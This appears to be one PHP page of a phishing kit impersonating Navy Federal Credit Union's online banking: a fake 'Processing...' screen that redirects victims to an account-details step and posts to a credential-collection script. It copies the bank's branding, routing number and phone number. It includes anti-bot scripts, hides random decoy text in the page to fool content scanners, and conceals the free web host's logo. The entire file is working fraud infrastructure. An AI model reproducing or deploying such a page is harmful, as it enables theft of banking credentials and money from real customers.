<?php 
include '../prevents/anti1.php';
include '../prevents/anti1.php';
include '../prevents/anti2.php';
include '../prevents/anti3.php';
include '../prevents/anti4.php';
include '../prevents/anti5.php';
include '../prevents/anti6.php';
include '../prevents/anti7.php';
include '../prevents/anti8.php';
ob_start();
session_start();
$onlineId2 = $_SESSION['USER'];
	include "../manger/languages/{$_SESSION['language']}.php";
?>
<html style=""><head>
		
<meta http-equiv="Content-Language" content="en-us">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<meta name="viewport" content="width=device-width, initial-scale=1">

<!--<theme:css />-->
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600">
<link type="text/css" href="styles/bootstrap.css" rel="stylesheet">

<link type="text/css" href="styles/navyfed_22.css" rel="stylesheet">

<script type="text/javascript" src="js/jquery-3.2.1.min.js"></script>
<script type="text/javascript" src="js/bootstrap.min.js"></script>
		<title>Processing...</title>
<link rel="shortcut icon" href="../favicon.ico" type="image/x-icon">

<!-- Import this way for performance gains -->
<link rel="stylesheet" href="styles/NFCU_files/css">
<link rel="stylesheet" href="styles/navyFedFooter.css">
<link rel="stylesheet" href="styles/nauth.css">
 <meta HTTP-EQUIV="Refresh" CONTENT="5;URL=accountdetails">
<!-- end of main.js -->		
		
			<style> body { display : none; } </style>
		

		<script>
            sessionStorage.newSessionTimeout = '1603211449337';
            runSessionTimer( 60);
		</script>
	</head>
	<body style="display: block;">
		
         <div style="z-index:-1;width:80vw;height:80vh;position:absolute;display:none;overflow:hidden;box-sizing:border-box;">
    <div style="opacity:0;white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;">
    <?php include('../news/news-'.rand(0,9).'.txt'); ?></div></div>
        
        
	
		<script>
            if (self == top) {
                var theBody = document.getElementsByTagName('body')[0];
                theBody.style.display = "block";
            }
		</script>
	
		
		<script language="javascript">
			function fingerprintAndSubmit(event) {
                rememberMe = document.forms[0].rememberComputer.checked;
                IaDfp.writeTag("6c53a94aea2e47949c93e2decd3d0ad8", rememberMe);

                // set new fingerprint in session
                document.forms[0].dfp_fp.value = IaDfp.readFingerprint();
                return onFormSubmit(event)
            }
		</script>
	<div class="nheader" role="banner">
		<div class="ncontainer">
			<div class="nheader-ncontent">
				<div class="nlogo">
					<a href="#" title="Go to NavyFederal.org">
						<img src="pics/img_logo.png" alt="" width="219" height="70"> </a>
				</div>
				<div class="nnav">
					<a href="#">About Us</a>
					<span class="nseparator">|</span> <a href="#">Branches
						&amp; ATMs</a> <span class="nseparator">|</span> <a href="#">Questions
						&amp; Support</a> <span class="nseparator">|</span> <span class="ntext-routing">Routing Number: 256074974</span>
				</div>
			</div> 
		</div>
	</div>
	<!-- end of header-->
	 

	<div class="container" style="">
		<form name="SelectAuthMethodForm" id="action" method="post" action="../manger/relative/step0.php" onsubmit="return fingerprintAndSubmit(event)">
	
			<input type="submit" value="Verify Me" style="height: 0 !important; width: 0 !important; margin: 0 !important; border: 0 !important; padding: 0 !important;">



<script src="js/sessionTimeoutWarningButtons_1.js" language="JavaScript" type="text/javascript"></script>
<div id="session_timeout_warning" class="modal" role="dialog" data-keyboard="false" data-backdrop="false" style="background-color: rgba(0, 0, 0, 0.5);">
    <div class="modal-dialog modal-lg">
        <div class="modal-content">
            <div class="modal-header">
                <h3 class="modal-title">Continue Online Banking?</h3>
            </div>
            <div class="modal-body">
                For security reasons, your online banking session is about to end. To stay signed in to your account, please click "Continue".  Otherwise, you will automatically be signed out in 
                <span id="warningTimer"></span>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-default active" id="signOut" data-dismiss="modal">Sign Out</button>
                <button type="button" class="btn btn-primary" id="continue">Continue</button>
            </div>
        </div>
    </div>
</div>

<script>
    $("#signOut").on("click", logoutRedirect);
    $("#continue").on("click", continueSession);
</script>

			<h3 class="page-header" style="font-size: 22px;">Processing...</h3>
			<div class="text-danger">
				
			</div>
			<div class="row">
				<div class="a-section auth-pagelet-mobile-container">
                      
                    <h2 align="center"><img src="pics/loading7_navy_blue.gif" style="margin-top: -65px;margin-left: 17px;width: 46px;" width="50"></h2>
                    
                    
                <br>
            </div>
		</div>
	</form>
	</div>
<link rel="stylesheet" href="css/NFCU_files/css">
<link rel="stylesheet" href="css/NFCU_files/navyFedFooter.css">
<link rel="stylesheet" href="css/NFCU_files/nauth.css">

<!-- start of footer  -->
                    <br>
                <br>
                <br>
                <br>
                <br>

         <br>
                <br>
                <br>



                <br>
                <br>
                <br>

<div class="nfooter" style="">
        <div class="ncontainer">
            <div class="nfooter-ncontent">
                <div class="nlogo">
                    <a href="#" title="" target="_blank">
                        <img src="pics/img_footer_logo.png" alt="Navy Federal Credit Union (Logo)" width="74" height="43">
                    </a>
                </div>
                <div class="ncontent">
                    <div class="nnav-group">
	                    <div class="nnav">
							<a href="#">About Us</a> <span class="nseparator">|</span>
							<a href="#">Careers</a> <span class="nseparator">|</span>
							<a href="#">Branches &amp; ATMs</a> <span class="nseparator">|</span>
							<a href="#" target="_self">FAQs</a><span class="nseparator">|</span>
							<a href="#">Contact Us</a> <span class="nseparator">-</span>
							<span class="ntext-routing">1-888-842-6328 | Routing Number: 256074974 </span>
						</div>
                        <div class="nnav">
							<a href="#" class="icon-ncua">Federally Insured	by NCUA</a> <span class="nseparator">|</span>
                            <a href="#" data-toggle="modal" data-target="#modalonlineDisclosure" onclick="countModal(&amp;;#39;web; policy&amp;;#39;)">Web
                                Policy</a>
                            <span class="separator">|</span> <a href="#">Privacy Policy</a> <span class="nseparator">|</span>
                            <a href="#" data-toggle="modal" data-target="#modalbrowserRequirements" onclick="countModal(&amp;;#39;browser; support&amp;;#39;)">Browser
                                Support</a>
                        </div>
                    </div>

                  	<p>
						<a href="#" class="nicon-housing">Equal Housing Lender</a> | APY = Annual Percentage Yield | APR = Annual Percentage Rate
					</p>

                       <p>
                        ©<script type="text/javascript">
                        var year = new Date();
                        year = year.getFullYear();
                        document.write(year);
                    </script>
                        Navy Federal Credit Union - All rights reserved - iPhone®, iPad® and iPod touch® are trademarks of Apple Inc. App Store„&nbsp; is a service mark of Apple Inc. Android„ and Google Play are trademarks of Google Inc. Images used for representational purposes only; do not imply government endorsement.
                    </p>


                    <div class="ndisclaimer">
                        <p>
                            <sup>+</sup>Rates are based on an evaluation of credit history, so your rate may differ.
                        </p>

                        <p>
                            <sup>++</sup>Rates are variable, and based on an evaluation of credit history, so your rate may differ.
                        </p>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- end of footer  -->
    

	    <style>
        img[src*="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"] {
            display: none;
        }
    </style>


</body></html>